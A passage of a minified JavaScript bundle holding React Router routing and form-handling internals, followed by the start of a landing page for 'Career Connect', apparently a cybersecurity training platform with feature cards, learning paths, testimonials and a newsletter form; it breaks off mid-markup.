c=K0(i.location,s);if(Q0&&!Mc.get(n))if(c.isExternal||i.reloadDocument)window.location.href=c.absoluteURL||c.to;else{const d=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(c.to,{replace:i.replace}));throw Mc.set(n,d),d}return v.createElement("meta",{httpEquiv:"refresh",content:`0;url=${c.absoluteURL||c.to}`})}}return a}function Gw({routeContext:a,match:n,children:s}){let i=v.useContext(Bn);return i&&i.static&&i.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=n.route.id),v.createElement(gr.Provider,{value:a},s)}function Qw(a,n=[],s=null,i=null,o=null){if(a==null){if(!s)return null;if(s.errors)a=s.matches;else if(n.length===0&&!s.initialized&&s.matches.length>0)a=s.matches;else return null}let c=a,d=s?.errors;if(d!=null){let p=c.findIndex(b=>b.route.id&&d?.[b.route.id]!==void 0);qe(p>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(d).join(",")}`),c=c.slice(0,Math.min(c.length,p+1))}let m=!1,f=-1;if(s)for(let p=0;p<c.length;p++){let b=c[p];if((b.route.HydrateFallback||b.route.hydrateFallbackElement)&&(f=p),b.route.id){let{loaderData:w,errors:j}=s,N=b.route.loader&&!w.hasOwnProperty(b.route.id)&&(!j||j[b.route.id]===void 0);if(b.route.lazy||N){m=!0,f>=0?c=c.slice(0,f+1):c=[c[0]];break}}}let x=s&&i?(p,b)=>{i(p,{location:s.location,params:s.matches?.[0]?.params??{},unstable_pattern:Pw(s.matches),errorInfo:b})}:void 0;return c.reduceRight((p,b,w)=>{let j,N=!1,k=null,F=null;s&&(j=d&&b.route.id?d[b.route.id]:void 0,k=b.route.errorElement||Vw,m&&(f<0&&w===0?(sp("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),N=!0,F=null):f===w&&(N=!0,F=b.route.hydrateFallbackElement||null)));let T=n.concat(c.slice(0,w+1)),R=()=>{let S;return j?S=k:N?S=F:b.route.Component?S=v.createElement(b.route.Component,null):b.route.element?S=b.route.element:S=p,v.createElement(Gw,{match:b,routeContext:{outlet:p,matches:T,isDataRoute:s!=null},children:S})};return s&&(b.route.ErrorBoundary||b.route.errorElement||w===0)?v.createElement(rp,{location:s.location,revalidation:s.revalidation,component:k,error:j,children:R(),routeContext:{outlet:null,matches:T,isDataRoute:!0},onError:x}):R()},null)}function Od(a){return`${a} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function Kw(a){let n=v.useContext(Bn);return qe(n,Od(a)),n}function Yw(a){let n=v.useContext(To);return qe(n,Od(a)),n}function Jw(a){let n=v.useContext(gr);return qe(n,Od(a)),n}function Dd(a){let n=Jw(a),s=n.matches[n.matches.length-1];return qe(s.route.id,`${a} can only be used on routes that contain a unique "id"`),s.route.id}function Xw(){return Dd("useRouteId")}function Zw(){let a=v.useContext(Ld),n=Yw("useRouteError"),s=Dd("useRouteError");return a!==void 0?a:n.errors?.[s]}function e1(){let{router:a}=Kw("useNavigate"),n=Dd("useNavigate"),s=v.useRef(!1);return ep(()=>{s.current=!0}),v.useCallback(async(o,c={})=>{Jt(s.current,Z0),s.current&&(typeof o=="number"?await a.navigate(o):await a.navigate(o,{fromRouteId:n,...c}))},[a,n])}var Mm={};function sp(a,n,s){!n&&!Mm[a]&&(Mm[a]=!0,Jt(!1,s))}v.memo(t1);function t1({routes:a,future:n,state:s,onError:i}){return tp(a,void 0,s,i,n)}function Er({to:a,replace:n,state:s,relative:i}){qe(Un(),"<Navigate> may be used only in the context of a <Router> component.");let{static:o}=v.useContext(qt);Jt(!o,"<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.");let{matches:c}=v.useContext(gr),{pathname:d}=ws(),m=zn(),f=Id(a,Rd(c),d,i==="path"),x=JSON.stringify(f);return v.useEffect(()=>{m(JSON.parse(x),{replace:n,state:s,relative:i})},[m,x,i,n,s]),null}function Tr(a){qe(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function r1({basename:a="/",children:n=null,location:s,navigationType:i="POP",navigator:o,static:c=!1,unstable_useTransitions:d}){qe(!Un(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let m=a.replace(/^\/*/,"/"),f=v.useMemo(()=>({basename:m,navigator:o,static:c,unstable_useTransitions:d,future:{}}),[m,o,c,d]);typeof s=="string"&&(s=$n(s));let{pathname:x="/",search:p="",hash:b="",state:w=null,key:j="default"}=s,N=v.useMemo(()=>{let k=Mr(x,m);return k==null?null:{location:{pathname:k,search:p,hash:b,state:w,key:j},navigationType:i}},[m,x,p,b,w,j,i]);return Jt(N!=null,`<Router basename="${m}"> is not able to match the URL "${x}${p}${b}" because it does not start with the basename, so the <Router> won't render anything.`),N==null?null:v.createElement(qt.Provider,{value:f},v.createElement(Ha.Provider,{children:n,value:N}))}function s1({children:a,location:n}){return qw(hd(a),n)}function hd(a,n=[]){let s=[];return v.Children.forEach(a,(i,o)=>{if(!v.isValidElement(i))return;let c=[...n,o];if(i.type===v.Fragment){s.push.apply(s,hd(i.props.children,c));return}qe(i.type===Tr,`[${typeof i.type=="string"?i.type:i.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),qe(!i.props.index||!i.props.children,"An index route cannot have child routes.");let d={id:i.props.id||c.join("-"),caseSensitive:i.props.caseSensitive,element:i.props.element,Component:i.props.Component,index:i.props.index,path:i.props.path,middleware:i.props.middleware,loader:i.props.loader,action:i.props.action,hydrateFallbackElement:i.props.hydrateFallbackElement,HydrateFallback:i.props.HydrateFallback,errorElement:i.props.errorElement,ErrorBoundary:i.props.ErrorBoundary,hasErrorBoundary:i.props.hasErrorBoundary===!0||i.props.ErrorBoundary!=null||i.props.errorElement!=null,shouldRevalidate:i.props.shouldRevalidate,handle:i.props.handle,lazy:i.props.lazy};i.props.children&&(d.children=hd(i.props.children,c)),s.push(d)}),s}var go="get",bo="application/x-www-form-urlencoded";function Po(a){return typeof HTMLElement<"u"&&a instanceof HTMLElement}function n1(a){return Po(a)&&a.tagName.toLowerCase()==="button"}function a1(a){return Po(a)&&a.tagName.toLowerCase()==="form"}function i1(a){return Po(a)&&a.tagName.toLowerCase()==="input"}function o1(a){return!!(a.metaKey||a.altKey||a.ctrlKey||a.shiftKey)}function l1(a,n){return a.button===0&&(!n||n==="_self")&&!o1(a)}var ho=null;function c1(){if(ho===null)try{new FormData(document.createElement("form"),0),ho=!1}catch{ho=!0}return ho}var d1=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function $c(a){return a!=null&&!d1.has(a)?(Jt(!1,`"${a}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${bo}"`),null):a}function u1(a,n){let s,i,o,c,d;if(a1(a)){let m=a.getAttribute("action");i=m?Mr(m,n):null,s=a.getAttribute("method")||go,o=$c(a.getAttribute("enctype"))||bo,c=new FormData(a)}else if(n1(a)||i1(a)&&(a.type==="submit"||a.type==="image")){let m=a.form;if(m==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let f=a.getAttribute("formaction")||m.getAttribute("action");if(i=f?Mr(f,n):null,s=a.getAttribute("formmethod")||m.getAttribute("method")||go,o=$c(a.getAttribute("formenctype"))||$c(m.getAttribute("enctype"))||bo,c=new FormData(m,a),!c1()){let{name:x,type:p,value:b}=a;if(p==="image"){let w=x?`${x}.`:"";c.append(`${w}x`,"0"),c.append(`${w}y`,"0")}else x&&c.append(x,b)}}else{if(Po(a))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');s=go,i=null,o=bo,d=a}return c&&o==="text/plain"&&(d=c,c=void 0),{action:i,method:s.toLowerCase(),encType:o,formData:c,body:d}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");function Md(a,n){if(a===!1||a===null||typeof a>"u")throw new Error(n)}function h1(a,n,s){let i=typeof a=="string"?new URL(a,typeof window>"u"?"server://singlefetch/":window.location.origin):a;return i.pathname==="/"?i.pathname=`_root.${s}`:n&&Mr(i.pathname,n)==="/"?i.pathname=`${n.replace(/\/$/,"")}/_root.${s}`:i.pathname=`${i.pathname.replace(/\/$/,"")}.${s}`,i}async function f1(a,n){if(a.id in n)return n[a.id];try{let s=await import(a.module);return n[a.id]=s,s}catch(s){return console.error(`Error loading route module \`${a.module}\`, reloading page...`),console.error(s),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function m1(a){return a==null?!1:a.href==null?a.rel==="preload"&&typeof a.imageSrcSet=="string"&&typeof a.imageSizes=="string":typeof a.rel=="string"&&typeof a.href=="string"}async function p1(a,n,s){let i=await Promise.all(a.map(async o=>{let c=n.routes[o.route.id];if(c){let d=await f1(c,s);return d.links?d.links():[]}return[]}));return v1(i.flat(1).filter(m1).filter(o=>o.rel==="stylesheet"||o.rel==="preload").map(o=>o.rel==="stylesheet"?{...o,rel:"prefetch",as:"style"}:{...o,rel:"prefetch"}))}function $m(a,n,s,i,o,c){let d=(f,x)=>s[x]?f.route.id!==s[x].route.id:!0,m=(f,x)=>s[x].pathname!==f.pathname||s[x].route.path?.endsWith("*")&&s[x].params["*"]!==f.params["*"];return c==="assets"?n.filter((f,x)=>d(f,x)||m(f,x)):c==="data"?n.filter((f,x)=>{let p=i.routes[f.route.id];if(!p||!p.hasLoader)return!1;if(d(f,x)||m(f,x))return!0;if(f.route.shouldRevalidate){let b=f.route.shouldRevalidate({currentUrl:new URL(o.pathname+o.search+o.hash,window.origin),currentParams:s[0]?.params||{},nextUrl:new URL(a,window.origin),nextParams:f.params,defaultShouldRevalidate:!0});if(typeof b=="boolean")return b}return!0}):[]}function x1(a,n,{includeHydrateFallback:s}={}){return g1(a.map(i=>{let o=n.routes[i.route.id];if(!o)return[];let c=[o.module];return o.clientActionModule&&(c=c.concat(o.clientActionModule)),o.clientLoaderModule&&(c=c.concat(o.clientLoaderModule)),s&&o.hydrateFallbackModule&&(c=c.concat(o.hydrateFallbackModule)),o.imports&&(c=c.concat(o.imports)),c}).flat(1))}function g1(a){return[...new Set(a)]}function b1(a){let n={},s=Object.keys(a).sort();for(let i of s)n[i]=a[i];return n}function v1(a,n){let s=new Set;return new Set(n),a.reduce((i,o)=>{let c=JSON.stringify(b1(o));return s.has(c)||(s.add(c),i.push({key:c,link:o})),i},[])}function np(){let a=v.useContext(Bn);return Md(a,"You must render this element inside a <DataRouterContext.Provider> element"),a}function y1(){let a=v.useContext(To);return Md(a,"You must render this element inside a <DataRouterStateContext.Provider> element"),a}var $d=v.createContext(void 0);$d.displayName="FrameworkContext";function ap(){let a=v.useContext($d);return Md(a,"You must render this element inside a <HydratedRouter> element"),a}function w1(a,n){let s=v.useContext($d),[i,o]=v.useState(!1),[c,d]=v.useState(!1),{onFocus:m,onBlur:f,onMouseEnter:x,onMouseLeave:p,onTouchStart:b}=n,w=v.useRef(null);v.useEffect(()=>{if(a==="render"&&d(!0),a==="viewport"){let k=T=>{T.forEach(R=>{d(R.isIntersecting)})},F=new IntersectionObserver(k,{threshold:.5});return w.current&&F.observe(w.current),()=>{F.disconnect()}}},[a]),v.useEffect(()=>{if(i){let k=setTimeout(()=>{d(!0)},100);return()=>{clearTimeout(k)}}},[i]);let j=()=>{o(!0)},N=()=>{o(!1),d(!1)};return s?a!=="intent"?[c,w,{}]:[c,w,{onFocus:Ta(m,j),onBlur:Ta(f,N),onMouseEnter:Ta(x,j),onMouseLeave:Ta(p,N),onTouchStart:Ta(b,j)}]:[!1,w,{}]}function Ta(a,n){return s=>{a&&a(s),s.defaultPrevented||n(s)}}function j1({page:a,...n}){let{router:s}=np(),i=v.useMemo(()=>W0(s.routes,a,s.basename),[s.routes,a,s.basename]);return i?v.createElement(k1,{page:a,matches:i,...n}):null}function N1(a){let{manifest:n,routeModules:s}=ap(),[i,o]=v.useState([]);return v.useEffect(()=>{let c=!1;return p1(a,n,s).then(d=>{c||o(d)}),()=>{c=!0}},[a,n,s]),i}function k1({page:a,matches:n,...s}){let i=ws(),{manifest:o,routeModules:c}=ap(),{basename:d}=np(),{loaderData:m,matches:f}=y1(),x=v.useMemo(()=>$m(a,n,f,o,i,"data"),[a,n,f,o,i]),p=v.useMemo(()=>$m(a,n,f,o,i,"assets"),[a,n,f,o,i]),b=v.useMemo(()=>{if(a===i.pathname+i.search+i.hash)return[];let N=new Set,k=!1;if(n.forEach(T=>{let R=o.routes[T.route.id];!R||!R.hasLoader||(!x.some(S=>S.route.id===T.route.id)&&T.route.id in m&&c[T.route.id]?.shouldRevalidate||R.hasClientLoader?k=!0:N.add(T.route.id))}),N.size===0)return[];let F=h1(a,d,"data");return k&&N.size>0&&F.searchParams.set("_routes",n.filter(T=>N.has(T.route.id)).map(T=>T.route.id).join(",")),[F.pathname+F.search]},[d,m,i,o,x,n,a,c]),w=v.useMemo(()=>x1(p,o),[p,o]),j=N1(p);return v.createElement(v.Fragment,null,b.map(N=>v.createElement("link",{key:N,rel:"prefetch",as:"fetch",href:N,...s})),w.map(N=>v.createElement("link",{key:N,rel:"modulepreload",href:N,...s})),j.map(({key:N,link:k})=>v.createElement("link",{key:N,nonce:s.nonce,...k})))}function F1(...a){return n=>{a.forEach(s=>{typeof s=="function"?s(n):s!=null&&(s.current=n)})}}var _1=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{_1&&(window.__reactRouterVersion="7.11.0")}catch{}function S1({basename:a,children:n,unstable_useTransitions:s,window:i}){let o=v.useRef();o.current==null&&(o.current=ow({window:i,v5Compat:!0}));let c=o.current,[d,m]=v.useState({action:c.action,location:c.location}),f=v.useCallback(x=>{s===!1?m(x):v.startTransition(()=>m(x))},[s]);return v.useLayoutEffect(()=>c.listen(f),[c,f]),v.createElement(r1,{basename:a,children:n,location:d.location,navigationType:d.action,navigator:c,unstable_useTransitions:s})}var ip=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Qa=v.forwardRef(function({onClick:n,discover:s="render",prefetch:i="none",relative:o,reloadDocument:c,replace:d,state:m,target:f,to:x,preventScrollReset:p,viewTransition:b,unstable_defaultShouldRevalidate:w,...j},N){let{basename:k,unstable_useTransitions:F}=v.useContext(qt),T=typeof x=="string"&&ip.test(x),R=K0(x,k);x=R.to;let S=Uw(x,{relative:o}),[U,z,H]=w1(i,j),G=T1(x,{replace:d,state:m,target:f,preventScrollReset:p,relative:o,viewTransition:b,unstable_defaultShouldRevalidate:w,unstable_useTransitions:F});function O(B){n&&n(B),B.defaultPrevented||G(B)}let V=v.createElement("a",{...j,...H,href:R.absoluteURL||S,onClick:R.isExternal||c?n:O,ref:F1(N,z),target:f,"data-discover":!T&&s==="render"?"true":void 0});return U&&!T?v.createElement(v.Fragment,null,V,v.createElement(j1,{page:S})):V});Qa.displayName="Link";var A1=v.forwardRef(function({"aria-current":n="page",caseSensitive:s=!1,className:i="",end:o=!1,style:c,to:d,viewTransition:m,children:f,...x},p){let b=Ga(d,{relative:x.relative}),w=ws(),j=v.useContext(To),{navigator:N,basename:k}=v.useContext(qt),F=j!=null&&O1(b)&&m===!0,T=N.encodeLocation?N.encodeLocation(b).pathname:b.pathname,R=w.pathname,S=j&&j.navigation&&j.navigation.location?j.navigation.location.pathname:null;s||(R=R.toLowerCase(),S=S?S.toLowerCase():null,T=T.toLowerCase()),S&&k&&(S=Mr(S,k)||S);const U=T!=="/"&&T.endsWith("/")?T.length-1:T.length;let z=R===T||!o&&R.startsWith(T)&&R.charAt(U)==="/",H=S!=null&&(S===T||!o&&S.startsWith(T)&&S.charAt(T.length)==="/"),G={isActive:z,isPending:H,isTransitioning:F},O=z?n:void 0,V;typeof i=="function"?V=i(G):V=[i,z?"active":null,H?"pending":null,F?"transitioning":null].filter(Boolean).join(" ");let B=typeof c=="function"?c(G):c;return v.createElement(Qa,{...x,"aria-current":O,className:V,ref:p,style:B,to:d,viewTransition:m},typeof f=="function"?f(G):f)});A1.displayName="NavLink";var E1=v.forwardRef(({discover:a="render",fetcherKey:n,navigate:s,reloadDocument:i,replace:o,state:c,method:d=go,action:m,onSubmit:f,relative:x,preventScrollReset:p,viewTransition:b,unstable_defaultShouldRevalidate:w,...j},N)=>{let{unstable_useTransitions:k}=v.useContext(qt),F=I1(),T=L1(m,{relative:x}),R=d.toLowerCase()==="get"?"get":"post",S=typeof m=="string"&&ip.test(m),U=z=>{if(f&&f(z),z.defaultPrevented)return;z.preventDefault();let H=z.nativeEvent.submitter,G=H?.getAttribute("formmethod")||d,O=()=>F(H||z.currentTarget,{fetcherKey:n,method:G,navigate:s,replace:o,state:c,relative:x,preventScrollReset:p,viewTransition:b,unstable_defaultShouldRevalidate:w});k&&s!==!1?v.startTransition(()=>O()):O()};return v.createElement("form",{ref:N,method:R,action:T,onSubmit:i?f:U,...j,"data-discover":!S&&a==="render"?"true":void 0})});E1.displayName="Form";function C1(a){return`${a} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function op(a){let n=v.useContext(Bn);return qe(n,C1(a)),n}function T1(a,{target:n,replace:s,state:i,preventScrollReset:o,relative:c,viewTransition:d,unstable_defaultShouldRevalidate:m,unstable_useTransitions:f}={}){let x=zn(),p=ws(),b=Ga(a,{relative:c});return v.useCallback(w=>{if(l1(w,n)){w.preventDefault();let j=s!==void 0?s:qa(p)===qa(b),N=()=>x(a,{replace:j,state:i,preventScrollReset:o,relative:c,viewTransition:d,unstable_defaultShouldRevalidate:m});f?v.startTransition(()=>N()):N()}},[p,x,b,s,i,n,a,o,c,d,m,f])}var P1=0,R1=()=>`__${String(++P1)}__`;function I1(){let{router:a}=op("useSubmit"),{basename:n}=v.useContext(qt),s=Xw(),i=a.fetch,o=a.navigate;return v.useCallback(async(c,d={})=>{let{action:m,method:f,encType:x,formData:p,body:b}=u1(c,n);if(d.navigate===!1){let w=d.fetcherKey||R1();await i(w,s,d.action||m,{unstable_defaultShouldRevalidate:d.unstable_defaultShouldRevalidate,preventScrollReset:d.preventScrollReset,formData:p,body:b,formMethod:d.method||f,formEncType:d.encType||x,flushSync:d.flushSync})}else await o(d.action||m,{unstable_defaultShouldRevalidate:d.unstable_defaultShouldRevalidate,preventScrollReset:d.preventScrollReset,formData:p,body:b,formMethod:d.method||f,formEncType:d.encType||x,replace:d.replace,state:d.state,fromRouteId:s,flushSync:d.flushSync,viewTransition:d.viewTransition})},[i,o,n,s])}function L1(a,{relative:n}={}){let{basename:s}=v.useContext(qt),i=v.useContext(gr);qe(i,"useFormAction must be used inside a RouteContext");let[o]=i.matches.slice(-1),c={...Ga(a||".",{relative:n})},d=ws();if(a==null){c.search=d.search;let m=new URLSearchParams(c.search),f=m.getAll("index");if(f.some(p=>p==="")){m.delete("index"),f.filter(b=>b).forEach(b=>m.append("index",b));let p=m.toString();c.search=p?`?${p}`:""}}return(!a||a===".")&&o.route.index&&(c.search=c.search?c.search.replace(/^\?/,"?index&"):"?index"),s!=="/"&&(c.pathname=c.pathname==="/"?s:Lr([s,c.pathname])),qa(c)}function O1(a,{relative:n}={}){let s=v.useContext(J0);qe(s!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:i}=op("useViewTransitionState"),o=Ga(a,{relative:n});if(!s.isTransitioning)return!1;let c=Mr(s.currentLocation.pathname,i)||s.currentLocation.pathname,d=Mr(s.nextLocation.pathname,i)||s.nextLocation.pathname;return Fo(o.pathname,d)!=null||Fo(o.pathname,c)!=null}const fo=({label:a,value:n,icon:s})=>e.jsxs("div",{className:"bg-[#000000]/50 p-4 rounded-lg border border-[#00FF88]/10",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[s,e.jsx("span",{className:"text-[10px] font-mono text-[#00B37A]",children:a})]}),e.jsx("div",{className:"text-xl font-bold text-white",children:n})]}),Sn=({icon:a,title:n,copy:s})=>e.jsxs("div",{className:"group bg-[#0A0F0A] border border-[#00FF88]/10 hover:border-[#00FF88]/50 rounded-2xl p-8 transition-all hover:bg-[#00FF88]/5",children:[e.jsx("div",{className:"w-12 h-12 rounded-xl bg-[#00FF88]/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform border border-[#00FF88]/20",children:e.jsx("div",{className:"text-[#00FF88]",children:a})}),e.jsx("h3",{className:"text-xl font-bold text-white mb-3 uppercase tracking-wide",children:n}),e.jsx("p",{className:"text-sm text-[#00B37A] leading-relaxed",children:s})]}),Bc=({title:a,level:n,features:s,highlight:i,onApply:o})=>e.jsxs("div",{className:`relative p-8 rounded-2xl border flex flex-col justify-between transition-all hover:-translate-y-1 ${i?"bg-[#00FF88]/5 border-[#00FF88] shadow-[0_0_30px_rgba(0,255,136,0.1)]":"bg-[#0A0F0A] border-[#00FF88]/10 hover:border-[#00FF88]/30"}`,children:[i&&e.jsx("div",{className:"absolute -top-3 left-1/2 -translate-x-1/2 px-4 py-1 bg-[#00FF88] text-black text-xs font-bold uppercase tracking-widest rounded-full",children:"Recommended"}),e.jsxs("div",{children:[e.jsxs("div",{className:"flex justify-between items-start mb-6",children:[e.jsxs("div",{children:[e.jsx("h3",{className:"text-2xl font-black text-white uppercase tracking-tight",children:a}),e.jsx("div",{className:"text-xs font-mono text-[#00FF88] mt-1",children:n})]}),e.jsx(ze,{className:`h-6 w-6 ${i?"text-[#00FF88]":"text-[#00B37A]"}`})]}),e.jsx("ul",{className:"space-y-4 mb-8",children:s.map(c=>e.jsxs("li",{className:"flex items-start gap-3 text-sm text-[#EAEAEA]",children:[e.jsx(Pe,{className:"h-4 w-4 text-[#00FF88] mt-0.5 flex-shrink-0"}),c]},c))})]}),e.jsx("button",{onClick:o,className:`w-full py-3 rounded-lg font-bold uppercase tracking-wide transition-all ${i?"bg-[#00FF88] text-black hover:bg-[#00CC66]":"bg-[#00FF88]/10 text-[#00FF88] hover:bg-[#00FF88]/20"}`,children:"Initialize"})]}),Uc=({icon:a,title:n,subtitle:s,description:i,onClick:o})=>e.jsxs("button",{onClick:o,className:"group relative flex flex-col items-center text-center p-8 bg-[#0A0F0A] border border-[#00FF88]/20 hover:border-[#00FF88] rounded-2xl transition-all hover:bg-[#00FF88]/5 hover:shadow-[0_0_50px_rgba(0,255,136,0.1)] hover:-translate-y-2 w-full",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-b from-[#00FF88]/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity rounded-2xl"}),e.jsx("div",{className:"mb-6 p-6 bg-[#00FF88]/10 rounded-full border border-[#00FF88]/20 group-hover:scale-110 transition-transform duration-300 shadow-[0_0_20px_rgba(0,255,136,0.1)]",children:a}),e.jsx("h3",{className:"text-2xl font-black text-white uppercase tracking-wide mb-2 group-hover:text-[#00FF88] transition-colors",children:n}),e.jsx("div",{className:"text-xs font-mono text-[#00B37A] mb-4 tracking-widest",children:s}),e.jsx("p",{className:"text-sm text-[#EAEAEA]/80 leading-relaxed max-w-xs",children:i}),e.jsxs("div",{className:"mt-6 flex items-center gap-2 text-xs font-bold text-[#00FF88] uppercase tracking-wider opacity-0 group-hover:opacity-100 transition-all translate-y-2 group-hover:translate-y-0",children:["Initialize ",e.jsx(Or,{className:"h-3 w-3"})]})]}),fd=()=>{const{user:a}=Ie(),n=zn(),[s,i]=v.useState(!1),[o,c]=v.useState(""),[d,m]=v.useState(null),f=v.useMemo(()=>[{name:"Sarah Rodriguez",title:"Security Analyst at TechCorp",quote:"Career Connect transformed my cybersecurity career. The hands-on labs made complex topics tangible.",initials:"SR"},{name:"Michael Johnson",title:"Penetration Tester at SecureNet",quote:"The virtual labs are realistic. I practiced techniques safely and gained confidence for real engagements.",initials:"MJ"},{name:"Dr. Amanda Chen",title:"Cybersecurity Professor",quote:"As an instructor I love how easy it is to create engaging content and track student progress.",initials:"AC"}],[]),[x,p]=v.useState(0);v.useEffect(()=>{const k=setInterval(()=>{p(F=>(F+1)%f.length)},5e3);return()=>clearInterval(k)},[f.length]);const b=(k,F)=>{if(a){k==="teacher"&&a.role==="teacher"?n("/teacher"):n("/dashboard");return}n(`/login?type=${k}${F?`&tab=${F}`:""}`)},w=k=>{if(k?.preventDefault(),!/^[\w-.]+@([\w-]+\.)+[\w-]{2,}$/.test(o)){m("Please enter a valid email address");return}m("Thanks! We'll keep you updated."),c(""),setTimeout(()=>m(null),4e3)},[j,N]=v.useState(!1);return v.useEffect(()=>{function k(){window.innerWidth>=640&&N(!1)}return window.addEventListener("resize",k),()=>window.removeEventListener("resize",k)},[]),e.jsx(e.Fragment,{children:e.jsxs("div",{className:"min-h-screen bg-[#000000] text-[#EAEAEA] font-sans selection:bg-[#00FF88]/30",children:[e.jsx("div",{className:"fixed inset-0 bg-[linear-gradient(to_right,#00FF8808_1px,transparent_1px),linear-gradient(to_bottom,#00FF8808_1px,transparent_1px)] bg-[size:24px_24px] pointer-events-none"}),e.jsx("div",{className:"fixed top-0 left-1/2 -translate-x-1/2 w-[800px] h-[500px] bg-[#00FF88]/10 blur-[120px] rounded-full pointer-events-none"}),e.jsxs("header",{className:"py-6 px-6 sticky top-0 z-40 backdrop-blur-md bg-[#000000]/80 border-b border-[#00FF88]/10",children:[e.jsxs("div",{className:"max-w-7xl mx-auto flex items-center justify-between",children:[e.jsx("div",{className:"flex items-center gap-3",children:e.jsxs("button",{"aria-label":"Home",className:"flex items-center gap-3 focus:outline-none group",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:[e.jsx("div",{className:"p-2 bg-[#00FF88]/10 border border-[#00FF88]/20 rounded-lg group-hover:bg-[#00FF88]/20 transition-colors",children:e.jsx(ze,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsxs("div",{className:"hidden sm:block text-left",children:[e.jsxs("div",{className:"text-lg font-black tracking-tighter text-white uppercase",children:["Career ",e.jsx("span",{className:"text-[#00FF88]",children:"Connect"})]}),e.jsx("div",{className:"text-[10px] font-mono text-[#00B37A] tracking-widest",children:"CYBERSECURITY OPS"})]})]})}),e.jsxs("nav",{className:"hidden sm:flex items-center gap-8",children:[["Features","Paths","Testimonials"].map(k=>e.jsx("a",{className:"text-sm font-medium text-[#00B37A] hover:text-[#00FF88] transition-colors uppercase tracking-wide",href:`#${k.toLowerCase()}`,children:k},k)),e.jsx("div",{className:"h-4 w-px bg-[#00FF88]/20"}),e.jsx("button",{onClick:()=>b("student"),className:"px-6 py-2 rounded-lg bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold text-sm tracking-wide transition-all hover:shadow-[0_0_20px_rgba(0,255,136,0.3)]",children:a?"ACCESS TERMINAL":"INITIALIZE"})]}),e.jsx("div",{className:"sm:hidden",children:e.jsx("button",{"aria-expanded":j,"aria-controls":"mobile-menu",onClick:()=>N(k=>!k),className:"p-2 rounded-md text-[#00FF88] hover:bg-[#00FF88]/10",children:j?e.jsx(Co,{className:"h-6 w-6"}):e.jsx(oy,{className:"h-6 w-6"})})})]}),j&&e.jsx("div",{id:"mobile-menu",className:"sm:hidden absolute top-full left-0 right-0 bg-[#0A0F0A] border-b border-[#00FF88]/20 p-4 animate-in slide-in-from-top-2",children:e.jsxs("div",{className:"flex flex-col gap-4",children:[["Features","Paths","Testimonials"].map(k=>e.jsx("a",{className:"block px-4 py-2 text-[#00B37A] hover:text-[#00FF88] hover:bg-[#00FF88]/10 rounded-lg font-medium uppercase tracking-wide",href:`#${k.toLowerCase()}`,onClick:()=>N(!1),children:k},k)),e.jsx("button",{onClick:()=>{N(!1),b("student")},className:"w-full text-center px-4 py-3 rounded-lg bg-[#00FF88] text-black font-bold uppercase tracking-wide",children:a?"Access Terminal":"Initialize System"})]})})]}),e.jsx("section",{className:"relative py-24 px-6 overflow-hidden",children:e.jsxs("div",{className:"max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-16 items-center relative z-10",children:[e.jsxs("div",{children:[e.jsxs("div",{className:"inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20 text-[#00FF88] text-xs font-mono mb-6 animate-pulse",children:[e.jsx("span",{className:"w-2 h-2 rounded-full bg-[#00FF88]"}),"SYSTEM ONLINE // V2.0.4"]}),e.jsxs("h1",{className:"text-5xl md:text-7xl font-black tracking-tighter text-white mb-6 leading-tight",children:["MASTER THE ",e.jsx("br",{}),e.jsx("span",{className:"text-transparent bg-clip-text bg-gradient-to-r from-[#00FF88] to-[#00CC66]",children:"CYBER DOMAIN"})]}),e.jsx("p",{className:"text-lg text-[#00B37A] mb-8 max-w-xl leading-relaxed font-light",children:"Deploy into realistic combat simulations. Train with AI-driven adversaries. Earn industry-recognized credentials in a high-fidelity environment."}),e.jsxs("div",{className:"flex flex-wrap gap-4 items-center",children:[e.jsxs("button",{onClick:()=>b("student"),className:"group flex items-center gap-3 px-8 py-4 bg-[#00FF88] hover:bg-[#00CC66] text-black rounded-xl font-bold text-lg tracking-wide transition-all hover:shadow-[0_0_30px_rgba(0,255,136,0.4)]",children:[e.jsx(He,{className:"h-5 w-5"}),a?"ENTER DASHBOARD":"START MISSION",e.jsx(Or,{className:"h-5 w-5 group-hover:translate-x-1 transition-transform"})]}),e.jsxs("a",{className:"flex items-center gap-2 px-6 py-4 text-[#EAEAEA] hover:text-white border border-[#00FF88]/20 hover:border-[#00FF88]/50 rounded-xl font-medium transition-all hover:bg-[#00FF88]/5",href:"https://cybergame.sparkstudio.co.in/",target:"_blank",rel:"noreferrer",children:[e.jsx(In,{className:"h-5 w-5 text-[#00FF88]"}),"Simulate Attack"]})]}),e.jsxs("form",{onSubmit:w,className:"mt-12 max-w-md relative group",children:[e.jsx("div",{className:"absolute -inset-0.5 bg-gradient-to-r from-[#00FF88] 